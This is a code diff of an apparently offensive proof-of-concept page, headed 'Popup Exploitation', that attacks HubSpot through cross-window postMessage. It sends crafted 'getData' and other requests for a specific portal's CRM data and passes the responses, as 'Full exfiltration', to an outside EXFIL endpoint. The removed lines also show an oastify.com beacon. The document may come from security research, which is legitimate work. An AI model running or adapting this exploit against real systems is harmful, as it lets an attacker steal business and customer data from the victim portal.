@@ -12,7 +12,25 @@ function log(msg) {
     new Image().src = EXFIL + '/?log=' + encodeURIComponent(msg);
 }
 
+// Listen for logs FROM the sandbox iframe
 window.addEventListener('message', function(e) {
+    // Check if it's a log message from our sandbox
+    if (e.data && e.data.sandboxLog) {
+        log('SANDBOX: ' + e.data.sandboxLog);
+    }
+    
+    // Check if it's a response from HubSpot (relayed through sandbox)
+    if (e.data && e.data.hubspotResponse) {
+        log('HUBSPOT_RESPONSE: ' + e.data.hubspotResponse.substring(0, 200));
+        
+        // Full exfiltration
+        fetch(EXFIL + '/response', {
+            method: 'POST',
+            mode: 'no-cors',
+            body: e.data.hubspotResponse
+        });
+    }
+    
     if (e.data && e.data.action === 'startExploit') {
         log('TRIGGERED');
         
@@ -20,13 +38,12 @@ window.addEventListener('message', function(e) {
 <html>
 <body>
 <h2>Popup Exploitation</h2>
-<div id="log" style="font-family:monospace;font-size:11px;"></div>
+<div id="log" style="font-family:monospace;font-size:11px;background:#000;color:#0f0;padding:10px;"></div>
 <script>
-const E = 'https://l6s5jp6udf0bc26os0vl0scprgx7l19q.oastify.com';
-
 function l(m) { 
     document.getElementById('log').innerHTML += '<br>' + m;
-    new Image().src = E + '/?s=' + encodeURIComponent(m); 
+    // Send logs to parent via postMessage
+    window.parent.postMessage({sandboxLog: m}, '*');
 }
 
 l('START_origin=' + window.origin);
@@ -50,18 +67,21 @@ if (!hub) {
             clearInterval(checker);
             l('hubspot_loaded_after_' + attempts);
             
-            // NOW ADD: Listen for responses
+            // Listen for responses from HubSpot
             window.addEventListener('message', function(resp) {
                 if (resp.source === hub) {
-                    l('GOT_RESPONSE_from=' + resp.origin);
+                    l('GOT_RESPONSE_origin=' + resp.origin);
                     l('response_type=' + (resp.data.type || 'unknown'));
                     
-                    const data = JSON.stringify(resp.data).substring(0, 400);
-                    new Image().src = E + '/?response=' + encodeURIComponent(data);
+                    // Send to parent
+                    const respStr = JSON.stringify(resp.data);
+                    window.parent.postMessage({
+                        hubspotResponse: respStr
+                    }, '*');
                 }
             });
             
-            // NOW ADD: Send exploits
+            // Send exploits
             setTimeout(() => {
                 l('sending_exploit_1');
                 
@@ -69,14 +89,14 @@ if (!hub) {
                     type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
                     commandId: 'getdata',
                     featureId: 'crm',
-                    parameters: {},
-                    resultCount: 1,
+                    parameters: {portalId: '46962361'},
+                    resultCount: 100,
                     language: 'en',
                     objectId: '46962361',
                     applicationId: 'crm',
-                    basePath: '/',
-                    maxPollingAttempts: 1,
-                    pollingInterval: 100
+                    basePath: '/crm',
+                    maxPollingAttempts: 5,
+                    pollingInterval: 200
                 }, '*');
             }, 1000);
             
@@ -87,10 +107,32 @@ if (!hub) {
                     type: 'raw',
                     _callbackId: 'exploit_' + Date.now(),
                     body: {
-                        action: 'getData'
+                        action: 'getData',
+                        portalId: '46962361'
                     }
                 }, '*');
             }, 2000);
+            
+            setTimeout(() => {
+                l('sending_exploit_3');
+                
+                hub.postMessage({
+                    type: 'TOGGLE_DARK_MODE',
+                    isDarkMode: true
+                }, '*');
+            }, 3000);
+            
+            setTimeout(() => {
+                l('sending_exploit_4');
+                
+                hub.postMessage({
+                    type: 'CONTENT_ASSISTANCE_DELEGATED_FEEDBACK',
+                    feedbackAnnotatedCompletions: {
+                        portalId: '46962361',
+                        getData: true
+                    }
+                }, '*');
+            }, 4000);
         }
         
         if (attempts > 100) {
